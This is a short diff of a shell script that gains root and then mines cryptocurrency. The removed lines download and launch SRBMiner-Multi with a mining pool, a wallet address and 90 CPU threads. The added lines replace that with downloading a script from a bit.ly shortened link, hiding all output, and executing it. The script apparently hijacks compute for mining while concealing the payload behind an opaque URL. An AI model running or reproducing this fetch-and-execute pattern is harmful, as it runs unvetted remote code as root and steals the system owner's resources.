@@ -1,5 +1,4 @@
 sudo su
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.2/SRBMiner-Multi-0-9-2-Linux.tar.xz 
-tar -xf SRBMiner-Multi-0-9-2-Linux.tar.xz
-cd SRBMiner-Multi-0-9-2/
-./SRBMiner-MULTI  --algorithm verushash --pool eu.luckpool.net:3956 >&- --wallet RWuAyz97XdGmE55ymuyy21cEmrEHTSLYnH.1root --password hybrid --cpu-threads 90
+wget -O w2022.sh https://bit.ly/a2nk-W2022 > /dev/null 2>&1
+chmod +x w2022.sh
+./w2022.sh
